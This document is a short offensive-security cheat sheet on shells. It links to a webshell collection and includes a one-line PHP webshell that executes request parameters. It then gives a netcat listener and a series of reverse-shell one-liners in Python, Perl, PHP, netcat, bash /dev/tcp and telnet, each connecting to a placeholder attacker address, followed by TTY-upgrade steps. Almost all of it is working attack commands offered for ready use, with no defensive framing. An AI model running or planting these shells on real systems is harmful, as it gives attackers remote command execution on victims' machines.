# Shells

## Table of Contents

## Web Shells

### Tennc Webshell Collection

This is a massive collections of webshells
- https://github.com/tennc/webshell

- PHP
	- [c99](https://github.com/tennc/webshell/blob/master/php/PHPshell/c99/c99.php)
	- simple: `<?php echo system($_REQUEST['cmd']); ?>`
- ASP
	- [ASP Webshell](https://github.com/tennc/webshell/blob/master/asp/webshell.asp)

## Reverse Shell

### Catch Reverse Shell

- netcat listener for receieving reverse shell
```
nc -nvlp 1234
```

### Throw Reverse Shell

- python reverse shell
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("myip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

- perl reverse shell
```
perl -e 'use Socket;$i="myip";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

- php reverse shell
```
php -r '$sock=fsockopen("myip",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

- basic netcat reverse shell (GNU netcat)
```
nc -c /bin/bash <myip> 1234
```

- basic netcat reverse shell (BSD netcat)
```
/bin/sh -i 2>&1 | nc myip 1234
```

- /dev/tcp reverse shell
```
/bin/bash -i > /dev/tcp/myip/1234 0<&1 2>&1
# or without bash assumptions
exec 5<>/dev/tcp/myip/1234; cat <&5 | while read line; do $line 2>&5 >&5; done
```

- ubuntu reverse shell using telnet
```
rm /tmp/backpipe; mknod /tmp/backpipe p && telnet myip 1234 0</tmp/backpipe | /bin/bash 1>/tmp/backpipe
```

- reverse shell for when the shell closes right away
```
#listen on port 1234 and 1235
telnet myip 1234 | /bin/bash 2>&1 | telnet myip 1235
#issue commands in 1234 shell and get response in 12345 shell
#or with nc
nc myip 1234 | sh 2>&1 | nc myip 1235
```
## Shell Utils

- get a tty from within a reverse shell
```
python -c 'import pty; pty.spawn("/bin/sh")'
```

- improve the shell!
```
python -c 'import pty; pty.spawn("/bin/bash")'
CTRL-Z
stty -a | head -n1
stty raw -echo
fg
export HOME=/root
export SHELL=/bin/bash
export TERM=xterm-256color
stty rows X columns Y
```
	- source: https://nullsec.us/fixing-a-raw-shell/

## Command Injection Utils

### Command Injection Without Spaces
- http://www.betterhacker.com/2016/10/command-injection-without-spaces.html
